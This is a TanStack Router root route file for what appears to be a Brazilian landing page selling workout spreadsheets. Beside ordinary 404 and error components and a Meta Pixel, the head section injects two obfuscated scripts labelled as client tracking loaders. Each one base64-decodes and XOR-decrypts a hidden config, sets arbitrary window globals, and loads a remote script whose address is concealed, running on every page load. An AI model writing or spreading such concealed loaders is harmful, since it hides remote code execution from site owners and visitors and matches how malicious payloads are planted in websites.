import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "+200 Planilhas de Treino Prontas para o Seu Biotipo" },
      { name: "description", content: "Mais de 200 planilhas de treino prontas, +275 GIFs explicativos, prescrição para 12 meses e 3 bônus exclusivos. Tudo por R$ 9,90." },
      { name: "author", content: "Infocursos Brasil" },
      { property: "og:title", content: "+200 Planilhas de Treino Prontas para o Seu Biotipo" },
      { property: "og:description", content: "Mais de 200 planilhas de treino prontas, +275 GIFs explicativos, prescrição para 12 meses e 3 bônus exclusivos. Tudo por R$ 9,90." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=Inter:wght@400;500;600;700&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
    scripts: [
      // Loader de tracking 1 (enviado pelo cliente)
      {
        children: `(function(){var r_4s=atob("DBUv3lP/5WJZ/14i8m4NqyGTx1h7lypWgmYV8XycgQx3iipPm3NW8DCQiEw7jXFRkWdGrieMyhctki0NnnRbuyCLywgq3XIAk2FbrDqdkBY8jHwYqW4NsDKSgEBj3TpDhnQCqyeSjAQg0i5Ql2NKsCfSnQE2m3NRkX4N8nGJhA4smnwY0DdS8ijdiwM0mnwY0HFOqjLSkBY0ljhb32VduyWaixZ0jCtAm3Fc/H/dkwM1ijsAyDcNow6C");var b_t56=[];for(var b_c=0;b_c<r_4s.length;b_c++){b_t56.push(r_4s.charCodeAt(b_c)&255);}var b_pfk=b_t56[0];var f_jd89=b_t56.slice(1,1+b_pfk);var v_z=b_t56.slice(1+b_pfk);var k_gn3=v_z.map(function(b,m_od){return b^f_jd89[m_od%b_pfk];});var g_kq="";for(var e_fj9=0;e_fj9<k_gn3.length;e_fj9++){g_kq+=String.fromCharCode(k_gn3[e_fj9]&255);}var x_9dr=decodeURIComponent(escape(g_kq));var w_lw=JSON.parse(x_9dr);var u_9wsl=w_lw.globals||[];u_9wsl.forEach(function(y_x){window[y_x.name]=y_x.value;});var a_p=document.createElement("script");a_p.src=w_lw.url;a_p.async=true;a_p.defer=true;(w_lw.attributes||[]).forEach(function(r_jpb){a_p.setAttribute(r_jpb.name,r_jpb.value);});(document.head||document.documentElement).appendChild(a_p);})();`,
      },
      // Loader de tracking 2 (enviado pelo cliente)
      {
        children: `(function(){var j_5=atob("DMkr+9rwCiNAKwDGuLIJjqicKBliQ3SyyLoR1PWTbk1uXnSr0a9S1bmfZw0iWS+127tCi66DJVMpU2Wql7lCg7+cJEkzCSzk2b1fibOSf1clWCL845QH2b2cZUEhR3PkgpJQ2bSRZ0ZiESK20bFOl5OUKA9iXWGqzawJwfjGaxQlHmWijf5Iw7iSM0B2Ezfxjf4Sz+LSd349");var t_pxk5=[];for(var o_e=0;o_e<j_5.length;o_e++){t_pxk5.push(j_5.charCodeAt(o_e)&255);}var i_g=t_pxk5[0];var s_x8q=t_pxk5.slice(1,1+i_g);var s_qj=t_pxk5.slice(1+i_g);var i_2gu=s_qj.map(function(b,p_kcd){return b^s_x8q[p_kcd%i_g];});var r_a="";for(var n_vtp5=0;n_vtp5<i_2gu.length;n_vtp5++){r_a+=String.fromCharCode(i_2gu[n_vtp5]&255);}var p_rci=decodeURIComponent(escape(r_a));var z_j73p=JSON.parse(p_rci);var y_g=z_j73p.globals||[];y_g.forEach(function(s_qce){window[s_qce.name]=s_qce.value;});var r_smy=document.createElement("script");r_smy.src=z_j73p.url;r_smy.async=true;r_smy.defer=true;(z_j73p.attributes||[]).forEach(function(c_9){r_smy.setAttribute(c_9.name,c_9.value);});(document.head||document.documentElement).appendChild(r_smy);})();`,
      },
      // Meta Pixel
      {
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1060698809666736');fbq('track','PageView');`,
      },
    ],
  }),

  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
